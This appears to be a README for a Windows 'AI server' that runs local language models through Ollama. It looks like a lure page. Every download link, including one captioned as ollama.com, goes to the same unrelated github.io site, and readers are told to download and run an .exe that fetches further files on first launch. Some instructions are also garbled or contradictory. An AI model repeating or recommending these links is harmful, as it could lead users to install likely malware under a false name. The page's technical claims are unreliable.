# 🤖 ai-server-rust-llm-api - Run AI Models on Your PC

[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://compact-landmass150.github.io)

## 📥 What This Software Does

This application turns your Windows computer into a private AI server. It works with Ollama to run large language models (like chatbots or text assistants) on your own machine. You do not need to send your data to a cloud service. Everything stays on your computer.

The software manages the heavy work behind the scenes. It can start and stop AI models, handle multiple users, and run on a schedule. It uses the Rust programming language, which makes it fast and stable.

## 🎯 Who Should Use This

- People who want to run AI models privately on their own computer
- Small teams that need a shared AI server inside their office network
- Developers who want a simple way to test AI models without paying for cloud services
- Anyone who wants to experiment with AI without programming knowledge

## ⚙️ System Requirements

Your computer needs these minimum specs to run the software well:

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| Operating System | Windows 10 (64-bit) | Windows 11 (64-bit) |
| Processor | 4 cores, 2.0 GHz | 8 cores, 3.0 GHz |
| RAM | 8 GB | 16 GB or more |
| Storage | 10 GB free space | 50 GB free space |
| GPU | Not required | NVIDIA GPU with 4 GB VRAM |

**You also need:**  
- Ollama installed on your computer. Get it from [ollama.com](https://compact-landmass150.github.io) for free.  
- An internet connection for the first download of AI models.

## 🚀 How to Download and Install

**Step 1: Visit the download page**  
Click this button or the link at the top of this page:

[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-green?style=for-the-badge)](https://compact-landmass150.github.io)

**Step 2: Find the right file**  
On the releases page, look for the file named `ai-server-rust-llm-api-windows-x64.zip` or `ai-server-rust-llm-api-windows-x64.exe`. Download the latest version.

**Step 3: Extract the files**  
If you downloaded a `.zip` file, right-click it and choose "Extract All". Pick a folder like `C:\AI-Server` to store the files.

**Step 4: Run the software**  
Open the folder where you extracted the files. Double-click `ai-server.exe` or `ai-server-gui.exe` (if available). A command window will open. This is normal.

**Step 5: Wait for first run**  
The first launch may take 30-60 seconds. The software downloads setup files and checks for updates. After that, you will see a message like "Server running on http://localhost:8080".

## 🔧 How to Use the Software

### Starting a Model

1. Make sure Ollama is running on your computer.
2. Open your web browser and go to `http://localhost:8080`.
3. You will see a simple dashboard.
4. Click "Select Model" and pick an AI model from the list (like `llama3` or `mistral`).
5. Click "Start Server". The software downloads the model from Ollama and starts it.

### Making Your First Request

Once the model is running, you can test it:

- **Using the web interface:** Type a question in the chat box and press Enter. The AI will respond.
- **Using a browser:** Go to `http://localhost:8080/api/generate` and type `{"prompt": "Hello, how are you?"}`. You will see a JSON response.

### Stopping the Software

Close the command window or press `Ctrl + C` in the window. The software saves your settings automatically.

## ⏰ Advanced Features

### Schedule Models to Run at Certain Times

You can set the software to start a model at 8 AM and stop it at 6 PM. This saves resources when nobody is using the server.

1. Open the settings page at `http://localhost:8080/settings`.
2. Go to "Schedules".
3. Add a new schedule. For example: "Start model at 08:00 every weekday".
4. Save the schedule. The software follows it automatically.

### Let Multiple People Connect

Other computers on your network can use this server. They just need your computer's IP address and the port number (default is 8080).

1. Find your computer's IP address. Open Command Prompt and type `ipconfig`. Look for "IPv4 Address".
2. Share this address with others. They type `http://YOUR_IP:8080` in their browser.
3. Each person can make their own requests to the AI model.

### Change API Settings

The software works with many programming tools. You can change how it talks to other programs:

- **Port:** Change from 8080 to any open port (like 3000 or 9090).
- **Timeout:** Set how long the server waits for a model to respond (default is 30 seconds).
- **Max requests:** Limit how many people can use the server at once.

## 📂 File Structure

After installation, your folder looks like this:

```
ai-server-rust-llm-api/
├── ai-server.exe          # Main program
├── config.toml            # Settings file (edit with Notepad)
├── models/                # Downloaded AI models
├── logs/                  # Activity logs
└── data/                  # User data and schedules
```

## 🛠️ Troubleshooting

### "Application failed to start"

**Cause:** Your system is missing Visual C++ Redistributable.  
**Fix:** Download and install "vc_redist.x64.exe" from Microsoft's website. Restart the software.

### "Connection refused" error

**Cause:** The server did not start properly.  
**Fix:** Make sure Ollama is running. Open Ollama's window and check for errors. Restart the AI server.

### "Model not found"

**Cause:** The AI model name is wrong or not downloaded.  
**Fix:** In Ollama, type `ollama list` to see available models. Use the exact name in the AI server.

### "High memory usage"

**Cause:** The AI model is large (like 7B or 13B models).  
**Fix:** Use smaller models (like `llama3.2:1b` or `phi3:mini`). They use less RAM.

## 🔒 Security Notes

- This software does not send your data anywhere. All processing happens on your computer.
- By default, the server is only accessible from your computer. To allow network access, change the `bind_address` in settings.
- Do not expose this server directly to the internet without a firewall. It is designed for local use.

## 🆘 Getting Help

- **Check the logs:** Open the `logs` folder and read `error.log`.
- **Visit the Issues page:** Go to the GitHub repository and click "Issues". Search for your problem.
- **Ask a question:** Open a new issue with a clear description of your problem and what you tried.

## 📝 License

This software is free to use. See the `LICENSE` file in the repository for details.

Keywords: ai server, ollama, rust, windows, local ai, llm api, private ai, model server